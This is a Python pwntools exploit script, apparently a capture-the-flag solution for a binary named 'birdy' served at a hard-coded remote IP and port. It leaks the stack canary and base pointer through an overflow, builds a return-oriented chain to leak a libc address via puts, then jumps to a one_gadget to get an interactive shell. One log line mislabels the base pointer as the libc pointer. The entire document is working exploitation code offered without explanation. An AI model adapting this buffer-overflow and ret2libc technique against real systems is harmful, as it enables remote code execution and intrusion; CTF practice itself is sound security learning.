from pwn import *

elf = ELF("./birdy")
libc = ELF("./libc-2.27.so")

context.binary = elf

def conn():
    if args.LOCAL:
        return process([elf.path])
    else:
        return remote("138.68.101.239", 1337)

def main():

    elfrop = ROP(elf)
    pop_rsi_popr15_ret = elfrop.find_gadget(["pop rsi", "pop r15", "ret"]).address
    pop_rdi_ret = elfrop.find_gadget(["pop rdi", "ret"]).address
    name_birdy = elf.sym.name_birdy

    r = conn()

    r.sendlineafter('Quick! What do you name it? ', 'a'*88)
    r.recvline()
    canary = u64(b'\0' + r.recv(7))
    rbp = u64(r.recvline(keepends=False).ljust(8, b'\0'))

    log.info('Leaking stack canary : ' + str(hex(canary)))
    log.info('Leaking base pointer : ' + str(hex(rbp)))

    payload = flat(canary, rbp-0x40, pop_rdi_ret, elf.got.puts, elf.plt.puts,
            pop_rdi_ret, rbp-0x38, pop_rsi_popr15_ret, 0x100, 0x0, elf.sym.readstr)
    payload = payload.ljust(0x58, b'\0')
    payload += p64(canary) + p64(rbp-0x88)

    r.send(payload)
    r.recvuntil('How do you feel now? ')
    libc.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - libc.sym.puts
    log.info('Leaking libc pointer : ' + str(hex(rbp)))
    one_gadget = libc.address + 0x4f432
    r.sendline(p64(one_gadget).ljust(0x100, b'\0'))

    r.interactive()

if __name__ == "__main__":
    main()
